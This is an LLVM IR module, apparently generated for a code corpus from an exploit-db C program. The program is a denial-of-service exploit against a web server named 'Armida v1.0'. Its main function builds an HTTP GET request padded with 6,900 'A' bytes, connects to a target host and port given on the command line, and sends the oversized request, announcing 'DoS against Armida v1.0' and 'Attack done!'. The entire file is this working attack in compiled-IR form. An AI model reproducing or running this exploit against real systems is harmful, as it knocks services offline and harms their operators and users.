; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22825.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_22825.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32 }
%struct.sockaddr = type { i32 }

@__const.main.get = private unnamed_addr constant [3 x i8] c"GET", align 1
@__const.main.http = private unnamed_addr constant [12 x i8] c"HTTP/1.0\0A\0A\00\00", align 1
@.str = private unnamed_addr constant [27 x i8] c"Usage: %s [target] <port>\0A\00", align 1
@.str.1 = private unnamed_addr constant [23 x i8] c"Connection failed!...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [25 x i8] c"DoS against Armida v1.0\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [23 x i8] c"Can't start socket()!\0A\00", align 1
@.str.4 = private unnamed_addr constant [16 x i8] c"Can't connect!\0A\00", align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"Attack done!...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca %struct.hostent*, align 8
  %9 = alloca [6915 x i8], align 16
  %10 = alloca [6900 x i8], align 16
  %11 = alloca [3 x i8], align 1
  %12 = alloca [12 x i8], align 1
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %13 = bitcast [3 x i8]* %11 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %13, i8* align 1 getelementptr inbounds ([3 x i8], [3 x i8]* @__const.main.get, i32 0, i32 0), i64 3, i1 false)
  %14 = bitcast [12 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %14, i8* align 1 getelementptr inbounds ([12 x i8], [12 x i8]* @__const.main.http, i32 0, i32 0), i64 12, i1 false)
  %15 = getelementptr inbounds [6900 x i8], [6900 x i8]* %10, i64 0, i64 0
  %16 = call i32 @memset(i8* %15, i8 signext 65, i32 6900)
  %17 = getelementptr inbounds [6915 x i8], [6915 x i8]* %9, i64 0, i64 0
  %18 = getelementptr inbounds [3 x i8], [3 x i8]* %11, i64 0, i64 0
  %19 = call i32 @strcpy(i8* %17, i8* %18)
  %20 = getelementptr inbounds [6915 x i8], [6915 x i8]* %9, i64 0, i64 0
  %21 = getelementptr inbounds [6900 x i8], [6900 x i8]* %10, i64 0, i64 0
  %22 = call i32 @strcat(i8* %20, i8* %21)
  %23 = getelementptr inbounds [6915 x i8], [6915 x i8]* %9, i64 0, i64 0
  %24 = getelementptr inbounds [12 x i8], [12 x i8]* %12, i64 0, i64 0
  %25 = call i32 @strcat(i8* %23, i8* %24)
  %26 = load i32, i32* %3, align 4
  %27 = icmp slt i32 %26, 3
  br i1 %27, label %28, label %34

28:                                               ; preds = %2
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8* %31)
  %33 = call i32 @exit(i32 0) #4
  unreachable

34:                                               ; preds = %2
  %35 = load i8**, i8*** %4, align 8
  %36 = getelementptr inbounds i8*, i8** %35, i64 2
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 @atoi(i8* %37)
  store i32 %38, i32* %5, align 4
  %39 = load i8**, i8*** %4, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 1
  %41 = load i8*, i8** %40, align 8
  %42 = call %struct.hostent* @gethostbyname(i8* %41)
  store %struct.hostent* %42, %struct.hostent** %8, align 8
  %43 = load %struct.hostent*, %struct.hostent** %8, align 8
  %44 = icmp eq %struct.hostent* %43, null
  br i1 %44, label %45, label %48

45:                                               ; preds = %34
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.1, i64 0, i64 0))
  %47 = call i32 @exit(i32 0) #4
  unreachable

48:                                               ; preds = %34
  %49 = load i32, i32* @AF_INET, align 4
  %50 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  store i32 %49, i32* %50, align 4
  %51 = load i32, i32* %5, align 4
  %52 = call i32 @htons(i32 %51)
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %52, i32* %53, align 4
  %54 = load i8**, i8*** %4, align 8
  %55 = getelementptr inbounds i8*, i8** %54, i64 1
  %56 = load i8*, i8** %55, align 8
  %57 = call i32 @inet_addr(i8* %56)
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 0
  store i32 %57, i32* %59, align 4
  %60 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %61 = load i32, i32* @AF_INET, align 4
  %62 = load i32, i32* @SOCK_STREAM, align 4
  %63 = call i32 @socket(i32 %61, i32 %62, i32 0)
  store i32 %63, i32* %6, align 4
  %64 = icmp slt i32 %63, 0
  br i1 %64, label %65, label %68

65:                                               ; preds = %48
  %66 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  %67 = call i32 @exit(i32 0) #4
  unreachable

68:                                               ; preds = %48
  %69 = load i32, i32* %6, align 4
  %70 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %71 = call i64 @connect(i32 %69, %struct.sockaddr* %70, i32 12)
  %72 = icmp slt i64 %71, 0
  br i1 %72, label %73, label %76

73:                                               ; preds = %68
  %74 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.4, i64 0, i64 0))
  %75 = call i32 @exit(i32 0) #4
  unreachable

76:                                               ; preds = %68
  %77 = load i32, i32* %6, align 4
  %78 = getelementptr inbounds [6915 x i8], [6915 x i8]* %9, i64 0, i64 0
  %79 = getelementptr inbounds [6915 x i8], [6915 x i8]* %9, i64 0, i64 0
  %80 = call i32 @strlen(i8* %79)
  %81 = call i32 @write(i32 %77, i8* %78, i32 %80)
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  %83 = load i32, i32* %6, align 4
  %84 = call i32 @close(i32 %83)
  ret i32 0
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #2

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @printf(i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @atoi(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @close(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
